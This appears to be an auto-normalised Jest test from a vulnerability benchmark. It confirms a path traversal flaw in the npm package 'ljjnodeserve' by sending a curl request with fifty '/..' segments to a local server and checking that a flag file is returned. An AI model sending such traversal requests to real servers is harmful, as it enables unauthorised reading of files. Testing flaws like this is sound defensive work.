const v26 = require('child_process');
var execSync = v26.execSync;
const v28 = () => {
    try {
        const v27 = execSync('fuser -k 8888/tcp');
        v27;
    } catch (e) {
    }
};
const v29 = afterAll(v28);
v29;
const path = require('path');
const v30 = require('sleep');
const sleep = v30.sleep;
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v31 = '/..'.repeat(50);
    const v32 = v31 + pathToFlag;
    return v32;
};
const v49 = done => {
    const v33 = expect.assertions(1);
    v33;
    const fs = require('fs');
    const sleep = require('sleep');
    const v34 = require('child_process');
    const exec = v34.exec;
    const v35 = fs.readFileSync(pathToFlag);
    let hostsFile = v35.toString();
    const a = require('child_process');
    try {
        const v36 = () => {
        };
        const v37 = a.execSync('fuser -k 8888/tcp', v36);
        v37;
    } catch (e) {
    }
    let server = 'node ./node_modules/ljjnodeserve/index.js ';
    const v38 = (error, stdout) => {
    };
    let exe = exec(server, v38);
    const v39 = sleep.sleep(2);
    v39;
    const v40 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${ v40 }"`;
    let end_serv = 'fuser -k 8888/tcp';
    const v47 = (error, stdout) => {
        let out = false;
        const v41 = stdout.includes(hostsFile);
        if (v41) {
            out = true;
        }
        const v42 = expect(out);
        const v43 = v42.toBe(true);
        v43;
        const v45 = (error, stdout) => {
            const v44 = done();
            v44;
        };
        const v46 = exec(end_serv, v45);
        v46;
    };
    const v48 = exec(attack_string, v47);
    v48;
};
const v50 = test('Path Traversal in ljjnodeserve', v49);
v50;